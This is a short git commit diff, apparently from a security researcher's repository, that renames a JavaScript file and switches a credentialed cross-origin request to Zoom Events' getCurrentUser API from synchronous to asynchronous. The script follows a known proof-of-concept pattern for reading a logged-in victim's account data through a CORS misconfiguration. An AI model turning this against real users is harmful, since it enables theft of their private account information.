83a9b14dc22d9f13754cc5bfcb0c01b834e4ea57
monixxxx <92028136+monixxxx@users.noreply.github.com>
2023-07-30 00:54:52 +0300

    Update and rename zmjonn.js to zom.js

--- zom.js
+++ zom.js
@@ -1,6 +1,6 @@
 var req = new XMLHttpRequest(); 
 req.onload = reqListener; 
-req.open('GET','https://events.zoom.us/api/v1/e/getCurrentUser',false); 
+req.open('GET','https://events.zoom.us/api/v1/e/getCurrentUser',true); 
 req.withCredentials = true;
 req.send();
 
